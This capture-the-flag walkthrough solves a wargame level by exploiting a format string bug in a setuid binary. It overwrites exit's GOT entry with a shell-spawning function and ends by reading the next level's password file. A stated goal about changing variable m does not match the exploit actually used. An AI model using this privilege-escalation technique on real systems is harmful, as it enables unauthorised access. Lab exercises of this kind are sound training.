# Level 5

https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf

## 1. Identity

```bash
$ id
uid=2045(level5) gid=2045(level5) groups=2045(level5),100(users)
```

## 2. Home directory

```bash
$ pwd
/home/user/level5

$ ls -la
[...]
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
[...]
```

## 3. Analyzing the file

Testing it :

```bash
$ ./level5
a
a
```

Expects an input and prints it

Nothing else...

Looking at our functions with gdb, main() calls the function n().
n() is vulnerable to format string attacks.
Then checks the value of m. If m equals 0x1025544, a shell is launched.
o() is an unused function but it launches a shell.
Our goal is to modify the value of m.

Functions adresses :
```bash
(gdb) info function
All defined functions:

Non-debugging symbols:
[...]
0x080484a4  o
```

Get the exit adress :
```bash
$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit <- this one
```

```bash
$ python -c 'print "BBBB" + " %x" * 10' | ./level5 
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078
```

The adress of exit is at the 4th position.

## 4. Getting the flag

```bash
$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
$ cat /tmp/exploit - | ./level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

End of simulation
